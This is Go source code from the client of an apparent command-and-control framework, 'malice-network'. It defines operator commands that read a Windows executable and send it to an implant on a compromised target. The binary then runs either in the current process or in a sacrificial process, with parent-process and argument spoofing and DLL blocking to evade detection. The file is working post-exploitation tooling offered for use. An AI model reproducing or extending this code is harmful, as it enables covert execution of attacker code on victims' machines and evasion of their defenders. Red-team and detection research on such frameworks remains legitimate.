package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/helper"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"google.golang.org/protobuf/proto"
	"os"
	"path/filepath"
)

// ExecutePECmd - Execute PE on sacrifice process
func ExecutePECmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	ppid := ctx.Flags.Uint("ppid")
	pePath := ctx.Args.String("path")
	paramString := ctx.Args.StringList("args")
	argue := ctx.Flags.String("argue")
	isBlockDll := ctx.Flags.Bool("block_dll")
	peBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(peBin) != consts.EXEFile {
		console.Log.Errorf("The file is not a PE file\n")
		return
	}

	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name: filepath.Base(pePath),
		Bin:  peBin,
		Type: consts.ModuleExecutePE,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   paramString,
		},
	})
	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}

// InlinePECmd - Execute PE in current process
func InlinePECmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	pePath := ctx.Args.String("path")
	peBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(peBin) != consts.EXEFile {
		console.Log.Errorf("The file is not a PE file\n")
		return
	}
	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name: filepath.Base(pePath),
		Bin:  peBin,
		Type: consts.ModuleExecutePE,
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}
